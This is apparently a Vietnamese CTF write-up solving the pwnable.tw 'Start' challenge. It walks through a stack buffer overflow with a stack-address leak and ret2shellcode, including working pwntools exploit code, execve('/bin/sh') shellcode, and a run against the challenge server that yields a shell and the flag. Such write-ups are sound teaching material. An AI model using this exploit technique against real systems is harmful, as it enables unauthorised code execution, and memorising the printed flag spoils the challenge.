# *Challenge: Start*
***
## Pseudo code:
- Ta sẽ dịch ngược file bằng IDA
```c
__int64 start()
{
  __int64 result; // rax

  result = 0x3C00000003LL;
  __asm
  {
    int     80h; LINUX - sys_write
    int     80h; LINUX -
  }
  return result;
}
```
- Mô tả chương trình: Đây có vẻ là 1 chương trình viết bằng asm cho phép ta nhập 1 buffer tối đa 0x3c byte bằng sys_read.

## Exploit:
- Kiểm tra các chế độ bảo vệ của file
```sh
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
-> Nhận xét:
+ Kiến trúc i386 32 bits little edian
+ có thể thực thi shellcode trên stack
+ Địa chỉ của file là cố định
+ Có thể buffer overflow

*-> Như vậy, hướng khai thác ban đầu sẽ là ret2shellcode 32bit.*

### Stage 1: Leak stack_address:

- Đầu tiên ta tính offset đến saved rip:
```sh
pwndbg> cyclic -l 0x61616166
Finding cyclic pattern of 4 bytes: b'faaa' (hex: 0x66616161)
Found at offset 20
```
-> offset = 20
- Ta sẽ tiến hành leak địa chỉ stack bằng cách quay lại thực thi hàm sys_write:
```py
write_addr = 0x08048087
pl = b'A'*20 + p32(write_addr)

p.sendafter(b"CTF:", pl)
stack_leak = u32(p.recv(4))
log.info("stack_leak: "+ hex(stack_leak))
```
- Kiểm tra:
```sh
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ ecx esp 0xffeff60c —▸ 0xffeff610 ◂— 1
01:0004│         0xffeff610 ◂— 1
02:0008│         0xffeff614 —▸ 0xfff0128d ◂— '/home/dinhduc/Documents/pwntw/Start/start'
03:000c│         0xffeff618 ◂— 0
```
```sh
[+] Waiting for debugger: Done
[*] stack_leak: 0xffeff610
```
### Stage 2: Ret2shellcode:

- Ta viết shellcode 32 bit để thực thi hàm execve("/bin/sh\0", 0, 0) như sau:
```py
sc = asm('''
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80
	''', arch = 'i386')
```
- Do đã mov ebx, esp nên lát nữa sau khi overwrite rip thì ta sẽ đưa chuỗi '/bin/sh' vào esp là oke.
- Ta có script:
```py
pl = sc.ljust(20, b'A') + p32(stack_leak) + b"/bin/sh\0"
p.send(pl)
```
- Kiểm tra:
```sh
0x804809c  <_start+60>    ret                                <0xffd9e750>
    ↓
   0xffd9e750                xor    edx, edx              EDX => 0
   0xffd9e752                mov    al, 0xb               AL => 0xb
   0xffd9e754                int    0x80 <SYS_execve>

```
- Nhận thấy chương trình ret vào địa chỉ stack nằm giữa shellcode nên bị mất 2 lệnh đầu nên ta sẽ trừ địa chỉ stack ta leak cho 0x4 byte:
```py
pl = sc.ljust(20, b'A') + p32(stack_leak - 0x4) + b"/bin/sh\0"
```
```
Kiểm tra:
0x804809c  <_start+60>    ret                                <0xfff9dcfc>
    ↓
   0xfff9dcfc                mov    ebx, esp              EBX => 0xfff9dd14 ◂— '/bin/sh'
   0xfff9dcfe                xor    ecx, ecx              ECX => 0
   0xfff9dd00                xor    edx, edx              EDX => 0
   0xfff9dd02                mov    al, 0xb               AL => 0xb
   0xfff9dd04                int    0x80 <SYS_execve>

```
-> Shellcode đã hoàn chỉnh.

- Cuối cùng ta gửi script lên server:

```sh
$ python3 solve.py r
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[*] stack_leak: 0xffad2820
[*] Switching to interactive mode
\x01\x00\x00\x007?\xad\xff\x00\x00\x00\x00I?\xad\xffFLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
$ id
uid=1000(start) gid=1000(start) groups=1000(start)
$ whoami
start
$  
```
***->  Đã chiếm được shell***

```
Flag: FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
```